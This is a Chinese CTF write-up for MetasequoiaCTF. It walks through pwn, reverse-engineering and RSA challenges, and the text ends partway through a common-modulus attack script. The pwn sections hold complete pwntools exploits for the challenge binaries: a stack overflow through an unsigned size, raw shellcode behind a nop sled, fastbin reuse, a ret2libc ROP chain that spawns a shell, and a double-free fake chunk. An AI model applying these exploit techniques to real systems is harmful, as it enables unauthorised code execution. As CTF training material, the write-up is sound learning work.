---
title: MetasequoiaCTF writeup
categories:
  - CTF
  - writeup
top_img: >-
  https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/ea6503c45cfe7010dd038787933e588c.jpg
cover: >-
  https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200221201016.png
date: 2020-02-21 20:11:15
tags:
  - dig 
  - rabbit
  - 二维码
  - RSA
  - RSA共模攻击
  - smali
  - double free
  - fastbin
  - nop sled
  - 无符号整数
  - shell
keywords:
description:
comments:
toc:
toc_number:
copyright:
mathjax:
katex:
hide:
---

# 前言

不知道是什么学校办的CTF比赛，从[imagin](https://imagin.vip/)师傅那里听说的，比赛时间是2月20日13:00到2月21日17:00，持续1天零4个小时，题目总体来说难度不大，适合练习，平台提供容器化专属题目环境，这点很赞。

比赛截图
![fb](https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200221205756.png)
<img src="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/MetasequoiaCTF/pic/solved2.png" alt="solved2.png" style="zoom:80%;" />

> 比赛知名度不高，参赛人数不多，排名第一实属侥幸


# Pwn

pwn题目总体来说难度不大，有两道堆入门级别的题目，正好拿来练手

## Blacksmith

- 题目描述：
  
    > 世界需要你去拯救！不过在那之前，先让铁匠为你打造一把称手的兵器吧。
    > By *Mercurio*
    
- 题目附件：[blacksmith](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Blacksmith/blacksmith)

- 考察点：无符号整数

- 难度：简单

- 初始分值：100

- 最终分值：85

- 完成人数：5

### 程序分析

忘记密码的函数如下：

```c
int forget(){
  size_t nbytes; // [rsp+8h] [rbp-48h]
  char buf; // [rsp+10h] [rbp-40h]

  nbytes = 0LL;
  puts("Forging...");
  puts("What's the size of this sword's name?");
  scanf("%d";
  if ( nbytes > 63 )
    return puts("The name is too long!");
  puts("And the name is?");
  read(0, &buf, nbytes);
  return puts("Here you are, the new sword!\n");
}
```

其中`read`的第三个参数是无符号整数，而`nbytes`是有符号整数，所以输入负数可以绕过长度检查，然后读大量数据造成栈溢出，执行程序中的后门

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './blacksmith'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400b23 # pop rdi ; ret

# elf, libc

# rop1
offset = 72
payload = 'A'*offset
payload += p64(0x4007D6)

sla('Your choice > ','1')
sla(' name?\n','-1')
ru('And the name is?\n')
debug()
sl(payload)

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
```



## Snow Mountain

- 题目描述：

    > 带**雪橇**了吗？一起**滑雪**！ 
    >
    > By *Mercurio*    						

- 题目附件：[snow_mountain](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/SnowMountain/snow_mountain)

- 考察点：shellcode、nop sled

- 难度：简单

- 初始分值：200

- 最终分值：184

- 完成人数：5

分析程序：

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3){
  char *rnd_pos; // rax
  void (__fastcall *sc)(const char *, _QWORD); // [rsp+8h] [rbp-1008h]
  unsigned int seed; // [rsp+10h] [rbp-1000h]

  setbuf(stdout, 0LL);
  srand(&seed);
  load_bg();
  puts(
    "You know you have to conquer the mountain before you fight with the Demon Dragon. Luckily, you've prepared a sled for skiing.\n");
  rnd_pos = sub_400841();
  printf("You check the map again. You need to reach the lair of the Demon Dragon.\nCurrent position: %p\n\n", rnd_pos);
  printf("What's your plan, hero?\n> ");
  fgets(&seed, 4096, stdin);
  printf("Where are you going to land?\n> ", 4096LL);
  __isoc99_scanf("%p", &sc);
  sc("%p", &sc);
  return 0LL;
}
```

程序末尾跳到指定位置执行shellcode，之前还给了一个栈的地址，但是读数据的时候加上了随机偏移，所以用足够多的nop填充在shellcode前面即可。

> 后来看官方wp，原来这种操作叫做nop sled :D

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './snow_mountain'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
shellcode = '\xeb\x18\x5e\x48\x8d\x7e\x01\xc4\xe2\x7d\x78\x0e\xc5\xfe\x6f\x07\xc5\xfd\xef\xc1\xc5\xfe\x7f\x07\xeb\x06\xe8\xe3\xff\xff\xff\xaa\xe2\x9b\x6a\xfa\xe2\x23\x48\xe2\x14\x85\xc8\xc3\xc4\x85\x85\xd9\xc2\xfc\xe2\x23\x4d\xfa\xfd\xe2\x23\x4c\x1a\x91\xa5\xaf'

# gadget
prdi = 0x00000000004009b3 # pop rdi ; ret

# elf, libc

ru('Current position: ')
addr = eval(rc(14))
info_addr('addr',addr)

ru('> ')
payload = '\x90'*1337*2
payload += shellcode
sl(payload)

ru('> ')
# debug()
sl(hex(addr))

# debug()
# info_addr('tag',addr)
# log.warning('--------------')

p.interactive()
```



## Summoner

- 题目描述：

    > 邪恶召唤师拦住了你的去路。这将是一场召唤师之间的对决。 
    > By *Mercurio*

- 题目附件：[summoner](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Summoner/summoner)

- 考察点：fastbin回收机制

- 难度：简单

- 初始分值：250

- 最终分值：239

- 完成人数：3

### 程序分析

功能：创建小怪、释放小怪、升级小怪、显示等级、派小怪打BOSS。

限制：只可以创建一个小怪，最高升到4级，只有5级小怪可以打败BOSS，给flag

分析一下，不难看出小怪结构体如下：

```c
struct imagin{
	char *name;
	int  level;
};
```

`summon`功能如下：

```c
cmd = "summon";
if ( !strncmp(&s, "summon", 6uLL) ){
    if ( imagin ){
        puts("Already have one creature. Release it first.");
    }
    else{
        cmd = "\n";
        nptr = strtok(&v11, "\n");
        if ( nptr ){
            imagin = malloc(0x10uLL);
            if ( !imagin ){
                puts("malloc() returned NULL. Out of Memory\n");
                exit(-1);
            }
            *imagin = strdup(nptr);             // call malloc
            cmd = nptr;
            printf("Current creature:\"%s\"\n", nptr);
        }
        else{
            puts("Invalid command");
        }
    }
}
```

`summon`的时候会先`malloc`一个`0x10`的chunk，随后的`strdup`也会调用`malloc`，chunk的大小取决于小怪名字的长度。

`release`功能如下：

```c
cmd = "release";
if ( !strncmp(&s, "release", 7uLL) ){
	if ( imagin ){
		free(*imagin);
		imagin = 0LL;
		puts("Released.");
	}
else{
puts("No creature summoned.");
}
```

`release`的时候释放了`strdup`分配的内存。

### 解题思路

题目环境是`libc2.23`，没开`t-cache`机制，所以可以控制小怪的名字长度，分配一个`0x10`大小的chunk，然后释放掉它，这样就有了一个`0x10`的`fastbin`，再次`summon`小怪的时候，小怪结构体会被分配到`strdup`用过的chunk，chunk中的数据没有被清空，只要让`chunk+8=5`即可伪造等级

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './summoner'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
sla('> ','summon aaaaaaaa\5') 
sla('> ','release')
sla('> ','summon aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa')
sla('> ','strike')

p.interactive()
```

### 官方wp

超级详细的[Summoner](https://github.com/SignorMercurio/MetasequoiaCTF/tree/master/Pwn/Summoner)解析



## demon_dragon

- 题目描述：

    > 在Demon Dragon的巢穴入口，你遇到了一位女巫。
    > 女巫说： 金克木，木克土，土克水，水克火，火克金。 
    > By *Mercurio*    						

- 题目附件：

    > [demon_dragon](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/DemonDragon/demon_dragon)
    > [libmagic.so](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/DemonDragon/libmagic.so)

- 考察点：动态链接？栈溢出

- 难度：简单

- 初始分值：300

- 最终分值：299

- 完成人数：2

### 程序分析

需要加载附件给的动态库，直接扔到`/lib`目录下即可在本地运行程序。

动态库里有乱七八糟一堆函数，都没有什么用，下面这个函数里有很明显的栈溢出，直接`ROP`带走即可

```c
__int64 sub_400C41(){
	// ...
    printf(
    "Suddenly, the Demon Dragon attacked you with %s, %s, %s, %s, %s!\n\n",
    (char *)v2 + 6 * dword_6020B0,
    (char *)v2 + 6 * dword_6020B4,
    (char *)v2 + 6 * dword_6020B8,
    (char *)v2 + 6 * dword_6020BC,
    (char *)v2 + 6 * dword_6020C0);
  printf("What are you going to do?!!\nSkill > ");
  return gets(&v1);
}
```

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './demon_dragon'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

# info
# gadget
prdi = 0x0000000000400e43 # pop rdi ; ret

# elf, libc
main = 0x00400D6E
# rop1
offset = 72
payload = 'A'*offset
payload += p64(prdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(main)

ru('Skill > ')
# debug()
sl(payload)
puts = uu64(rc(6))
info_addr('puts',puts)
libc_base = puts - libc.sym['puts']
info_addr('base',libc_base)
system = libc_base + libc.sym['system']
binsh = libc_base + libc.search('/bin/sh').next()

# rop2
ru('Skill > ')
payload2 = 'B'*offset
payload2 += p64(prdi) + p64(binsh) + p64(system) + p64(main)
debug()
sl(payload2)
# log.warning('--------------')

p.interactive()
```



## Samsara

- 题目描述：

    > 在击败Demon Dragon后，你终于也变成了Demon Dragon…… 
    > By *Mercurio* 	

- [题目附件](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Pwn/Samsara/samsara)

- 考察点：double free

- 难度：中等

- 初始分值：300

- 最终分值：299

- 完成人数：2

### 程序分析

菜单题，输入1创建大小为8的chunk，输入2将其释放，输入3可修改任意chunk数据，输入4打印变量`v9`地址，输入5可修改`v9`的值，输入6时判断变量`v10`，当`v10==0xDEADBEEF`时给flag

```c
void __fastcall main(__int64 a1, char **a2, char **a3){
  __int64 *v3; // rsi
  const char *v4; // rdi
  int v5; // ebx
  int v6; // [rsp+Ch] [rbp-44h]
  int v7; // [rsp+10h] [rbp-40h]
  __gid_t rgid; // [rsp+14h] [rbp-3Ch]
  __int64 v9; // [rsp+18h] [rbp-38h]
  __int64 v10; // [rsp+20h] [rbp-30h]
  __int64 v11; // [rsp+28h] [rbp-28h]
  __int64 v12; // [rsp+30h] [rbp-20h]
  unsigned __int64 v13; // [rsp+38h] [rbp-18h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  rgid = getegid();
  v3 = (__int64 *)rgid;
  setresgid(rgid, rgid, rgid);
  v10 = 0LL;
  v4 = "After defeating the Demon Dragon, you turned yourself into the Demon Dragon...";
  puts("After defeating the Demon Dragon, you turned yourself into the Demon Dragon...");
  while ( 2 ) {
    v12 = 0LL;
    sub_A50(v4, v3);
    v3 = (__int64 *)&v6;
    _isoc99_scanf("%d", &v6);
    switch ( (unsigned int)off_F70 ){
      case 1u:                                  // capture
        if ( i >= 7 ){
          v4 = "You can't capture more people.";
          puts("You can't capture more people.");
        }
        else{
          v5 = i;
          people[v5] = malloc(8uLL);
          ++i;
          v4 = "Captured.";
          puts("Captured.");
        }
        continue;
      case 2u:                                  // eat
        puts("Index:");
        v3 = (__int64 *)&v7;
        _isoc99_scanf("%d", &v7);
        free(people[v7]);
        v4 = "Eaten.";
        puts("Eaten.");
        continue;
      case 3u:                                  // cook
        puts("Index:");
        _isoc99_scanf("%d", &v7);
        puts("Ingredient:");
        v3 = &v12;
        _isoc99_scanf("%llu", &v12);
        *(_QWORD *)people[v7] = v12;
        v4 = "Cooked.";
        puts("Cooked.");
        continue;
      case 4u:                                  // show
        v3 = &v9;
        v4 = "Your lair is at: %p\n";
        printf("Your lair is at: %p\n", &v9);
        continue;
      case 5u:                                  // move
        puts("Which kingdom?");
        v3 = &v11;
        _isoc99_scanf("%llu", &v11);
        v9 = v11;
        v4 = "Moved.";
        puts("Moved.");
        continue;
      case 6u:                                  // flag
        if ( v10 == 0xDEADBEEFLL )
          system("cat flag");
        puts("Now, there's no Demon Dragon anymore...");
        break;
      default:
        goto LABEL_13;
    }
    break;
  }
LABEL_13:
  exit(1);
}
```

### 解题思路

在栈上伪造chunk，然后利用`double free`分配一个位于`v9-8`的chunk，输入3修改这个chunk，被修改的地址为`v9-8+16 = v10`，向其中写`0xdeadbeef`即可getflag

输入4修改`v9`的值为`0x21`即可伪造chunk，不伪造chunk的话，`malloc`会报错

```
chunk+0:  v9-8:xxx      v9: 0x21
chunk+8:  v10: 0x0      xxxxxxxx
```

### exp

```python
#!/usr/bin/python
#coding=utf-8
#__author__:TaQini

from pwn import *

local_file  = './samsara'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = local_libc # '../libc.so.6'

is_local = False
is_remote = False

if len(sys.argv) == 1:
    is_local = True
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    is_remote = True
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    else:
        host, port = sys.argv[1].split(':')
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    if is_local: gdb.attach(p,cmd)

def capture():
    sla('choice > ','1')

def eat(index):
    sla('choice > ','2')
    sla('Index:\n',str(index))

def cook(index, data):
    sla('choice > ','3')
    sla('Index:\n',str(index))
    sla('Ingredient:\n',str(data))

def show():
    sla('choice > ','4')
    ru('Your lair is at: ')
    return eval(rc(14))

def move(data):
    sla('choice > ','5')
    sla('Which kingdom?\n',str(data))

def commit():
    sla('choice > ','6')

ptr = show()
info_addr('ptr',ptr)
move(0x21)

capture() # 0
capture() # 1
capture() # 2

eat(0)
eat(1)
eat(0)

# debug()
capture()   # 3
cook(0,ptr-0x8) 
capture()   # 4
capture()   # 5 
capture()   # 6 
cook(6,0xdeadbeef)

commit()

p.interactive()
```



### 官方wp

官方wp讲解的很详细啊，摘录过来：D

> 逆向可以知道每次抓人都执行`malloc(8)`，我们不能控制分配的大小。那么在释放的时候，chunk必定进入fastbin。操作3就是编辑chunk的内容，不存在溢出。但是这题有两个奇怪的操作：输入4会打印出栈上变量`lair`的位置，输入5会改变`lair`的值。最后，退出程序时，检查栈上变量`target`是否等于`0xdeadbeef`，如果等于就能getflag，但是整个程序中不存在对`target`的任何读写操作。
>
> 漏洞点在于`free`之后没有置指针为NULL，考虑`double free`。首先分配三个chunk，按`chunk0->chunk1->chunk0`的顺序释放，第二次释放`chunk0`时它不在对应fastbin的头部，因此不会被检测到。再申请两次分别得到`chunk3`和`chunk4`，按first-fit原则前者即`chunk0`，后者即`chunk1`，但此时`chunk0`依然会留在fastbin中。
>
> 接下来，我们在`target`附近伪造chunk。我们逆向发现`lair`在`target`上方8B处，因此先输入4，设置`lair=0x20`以伪造`chunk_size`。然后输入5得到`&lair`，那么`&lair-8`处就是伪造的chunk的chunk指针。伪造好以后，我们向`chunk3`即`chunk0`的`fd`写入`&lair-8`。此时，fastbin内就变成了`chunk0->fake_chunk`，申请一次得到`chunk0`，第二次得到`fake_chunk`。
>
> 此时向`fake_chunk`写数据，等价于向`(&lair-8) + 0x10`也就是`target`写数据，写入`0xdeadbeef`并退出程序即可。
>
> ref: [Samsara](https://github.com/SignorMercurio/MetasequoiaCTF/tree/master/Pwn/Samsara)



# Re

re也都中规中矩，其中有一到smali的题，首次接触，涨了涨姿势

## CMCS

- 题目描述：

    > 你主导开发的CMCS(`Cyber Malware Control Software`)可以对全球各个角落的网络爬虫进行监控。但是今天，它似乎失灵了…… 
    > **得到的flag请包上flag提交。** 
    > By *?*

- 题目附件：[attachment.zip](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Reverse/CMCS/attachment.zip)

- 考察点：逆向分析

- 难度：简单

- 初始分值：100

- 最终分值：91

- 完成人数：5

主要代码：

```c
void sub_8048708(){
  wchar_t ws[8192]; // [esp+1Ch] [ebp-800Ch]
  wchar_t *s2; // [esp+801Ch] [ebp-Ch]

  s2 = sub_8048658(&s, &dword_8048A90);
  if ( fgetws(ws, 0x2000, stdin) ){
    ws[wcslen(ws) - 1] = 0;
    if ( !wcscmp(ws, s2) )
      wprintf(&right);
    else
      wprintf(&failed);
  }
  free(s2);
}
```

输入的字符串与`sub_8048658`的返回结果做比较，直接`gdb`调试，获取`sub_8048658`的返回值即为flag

> 9447{you_are_an_international_mystery}

9447 CTF 原题，flag都没改...



## babysmali

- 题目描述：

    > 你似乎找到了破坏CMCS的软件，于是尝试对其进行逆向，希望能发现这一切背后的始作俑者…… 
    > **得到的 flag 请包上 flag{} 提交。** 
    > By *?*

- 题目附件：[attachment.zip](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Reverse/Babysmali/attachment.zip)

- 考察点：smali逆向、base64换表

- 难度：简单

- 初始分值：250

- 最终分值：245

- 完成人数：2


先把smali转成java，再分析即可，用到的工具如下：

- smali.jar
- dex2jar-2.0
- jd-gui

### smali->dex

```shell
$ java -jar ./smali.jar ass ./src.smali
```

### dex->jar

```shell
$ ./d2j-dex2jar.sh ./out.dex
```

### jar->java

用jd-gui打开jar文件

```java
package com.example.hellosmali.hellosmali;

public class Digest {
  public static boolean check(String paramString) {
    if (paramString != null && paramString.length() != 0) {
      char[] arrayOfChar = paramString.toCharArray();
      StringBuilder stringBuilder2 = new StringBuilder();
      int i;
      for (i = 0; i < arrayOfChar.length; i++) {
        String str1;
        for (str1 = Integer.toBinaryString(arrayOfChar[i]); str1.length() < 8; str1 = "0" + str1);
        stringBuilder2.append(str1);
      } 
      while (stringBuilder2.length() % 6 != 0)
        stringBuilder2.append("0"); 
      String str = String.valueOf(stringBuilder2);
      arrayOfChar = new char[str.length() / 6];
      for (i = 0; i < arrayOfChar.length; i++) {
        int j = Integer.parseInt(str.substring(0, 6), 2);
        str = str.substring(6);
        arrayOfChar[i] = "+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".charAt(j);
      } 
      StringBuilder stringBuilder1 = new StringBuilder(String.valueOf(arrayOfChar));
      if (paramString.length() % 3 == 1) {
        stringBuilder1.append("!?");
      } else if (paramString.length() % 3 == 2) {
        stringBuilder1.append("!");
      } 
      return String.valueOf(stringBuilder1).equals("xsZDluYYreJDyrpDpucZCo!?");
    } 
    return false;
  }
}
```

### 解密

自定义base64，写脚本解密：

```python
#!/usr/bin/python
#__author__:TaQini

table = "+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

res = "xsZDluYYreJDyrpDpucZCo!?"[:-2]

l = []
for i in res:
    l.append(table.index(i))

s = ''
for i in l:
    b = bin(i)[2:].rjust(6,'0')
    s += b

# print s

h = hex(int(s,2))[2:-2]
# print h

print "flag{%s}"%h.decode('hex')
```



## Prison

- 题目描述：

    > 你的发现触动了某些人的利益，他们将你囚禁了起来。为了活下去，你必须逃离这里！ 
    > **flag格式：flag{你的逃跑路线}** 
    > By *?*

- 题目附件：[attachment.zip](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Reverse/Prison/attachment.zip)

- 考察点：逆向分析地图题

- 难度：中等

- 初始分值：350

- 最终分值：335

- 完成人数：4

走迷宫，地图是乱序给的，需要重新整理一下：

```python
#!/usr/bin/python
#__author__:TaQini

map = {0:"**########################################################################################",
10:"#************######*##############**************##*####*#######*##*##*###*#####*####*#####",
22:"###*#########*****************************************************************############",
24:"###*#########*###############################################*######*****************#####",
21:"###**********#############################################################################",
1:"#*######################*******************************************#####*************#####",
20:"############*#####*******************************************************************#####",
15:"###*#################################################*#########*##*######*#####*####*#####",
16:"###*####*****#####**********************#############*#########*##********#####*####*#####",
2:"#************************####*####################################*#####*###########*#####",
18:"###*####*###*#####*############################################*****************####*#####",
17:"###*####*###*#####*####################***************#########*###############*####*#####",
3:"#########*#########*#########*#######***************************##*#####*###########*#####",
26:"#############################################################*######*#####################",
4:"#******##*#########*#########*#######*#########################*##*#####*###########*#####",
5:"#*####*##*#########*#########*#######*#########################*##*#####********####*#####",
19:"###******###*#####*#################################################################*#####",
23:"###*#########*###############################################*############################",
6:"#*####*##*#########*######*******####*###**********####****####*##*############*####*#####",
7:"#*##***#**#########*#################*###*########*####*#######*##*############*####*#####",
25:"###**************************************************########*######*#####################",
8:"#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####",
9:"#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####",
11:"###################*##############################*####***#####*##*##*###*#####*####*#####",
12:"###################********************************############*##*##*###*#####*####*#####",
13:"###############################################################*##*##*###*#####*####*#####",
28:"#########################*****************************************************************",
14:"###***************************************************#########*##*##*###*#####*####*#####",
27:"#############################################################*######*#####################",
29:"#*#######*####**###*#######***#######*########**###*******##*****##########################",
30:"##*#####*###*###*##*######*#########*#*######*##*#####*#####*##############################",
31:"###*###*####*###*##*######*##**####*###*####*#########*#####***############################",
32:"####*#*#####*###*##*##*###*###*###*******####*##*#####*#####*##############################",
33:"#####*#######**####****####**####*#######*####**######*#####*##############################"}

for i in range(34):
    print map[i]
```

得到迷宫：

```
**########################################################################################
#*######################*******************************************#####*************#####
#************************####*####################################*#####*###########*#####
#########*#########*#########*#######***************************##*#####*###########*#####
#******##*#########*#########*#######*#########################*##*#####*###########*#####
#*####*##*#########*#########*#######*#########################*##*#####********####*#####
#*####*##*#########*######*******####*###**********####****####*##*############*####*#####
#*##***#**#########*#################*###*########*####*#######*##*############*####*#####
#*##*###*##########*##############****###*******##*####*#######*##*##*****#####*####*#####
#*##*###*##########*##############*############*##*####*#######*##*##*###*#####*####*#####
#************######*##############**************##*####*#######*##*##*###*#####*####*#####
###################*##############################*####***#####*##*##*###*#####*####*#####
###################********************************############*##*##*###*#####*####*#####
###############################################################*##*##*###*#####*####*#####
###***************************************************#########*##*##*###*#####*####*#####
###*#################################################*#########*##*######*#####*####*#####
###*####*****#####**********************#############*#########*##********#####*####*#####
###*####*###*#####*####################***************#########*###############*####*#####
###*####*###*#####*############################################*****************####*#####
###******###*#####*#################################################################*#####
############*#####*******************************************************************#####
###**********#############################################################################
###*#########*****************************************************************############
###*#########*###############################################*############################
###*#########*###############################################*######*****************#####
###**************************************************########*######*#####################
#############################################################*######*#####################
#############################################################*######*#####################
#########################*****************************************************************
```

耐心走完即可：

```python
#!/usr/bin/python
#__author__:TaQini

raw='r1,d2,r18,d10,r31,u6,l9,d2,r6,d2,l13,u2,r3,u5,r26,d15,r16,u13,l7,u4,r12,d19,l66,u4,r21,d1,r14,u3,l50,d5,r5,u3,r4,d5,l9,d4,r10,u3,r48,d6,r28'

flag = ''

for i in raw.split(','):
    op=i[0]
    tm=i[1:]
    flag+=op*eval(tm)

print "flag{%s}"%flag.upper()
```

> flag{RDDRRRRRRRRRRRRRRRRRRDDDDDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRUUUUUULLLLLLLLLDDRRRRRRDDLLLLLLLLLLLLLUURRRUUUUURRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDDDDDDDDDDRRRRRRRRRRRRRRRRUUUUUUUUUUUUULLLLLLLUUUURRRRRRRRRRRRDDDDDDDDDDDDDDDDDDDLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLUUUURRRRRRRRRRRRRRRRRRRRRDRRRRRRRRRRRRRRUUULLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLDDDDDRRRRRUUURRRRDDDDDLLLLLLLLLDDDDRRRRRRRRRRUUURRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRDDDDDDRRRRRRRRRRRRRRRRRRRRRRRRRRRR}



# Crypto

密码学3道题全是RSA，除了共模攻击，其余都不会，基本靠百度

## Ridicule

- 题目描述：

    > 你想要窃听Alice与Bob之间的通信，但他们使用了RSA加密，你无法破解。他们也知道这一点，为了嘲讽你，甚至把同一条消息发送了两次！ 
    > By *Mercurio*

- [题目附件](https://cdn.jsdelivr.net/gh/SignorMercurio/MetasequoiaCTF@master/Crypto/Ridicule/attachment.zip)

- 考察点：RSA共模攻击

- 难度：简单

- 初始分值：150

- 最终分值：124

- 完成人数：8

RSA共模攻击[参考](https://www.jianshu.com/p/2d95bdd0fb0d)

```python
#!/usr/bin/python
#__author__:TaQini

import sys

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

sys.setrecursionlimit(1000000)
e1 = 65537
e2 = 395327
s = egcd(e1, e2)
s1 = s[1]
s2 = s[2]
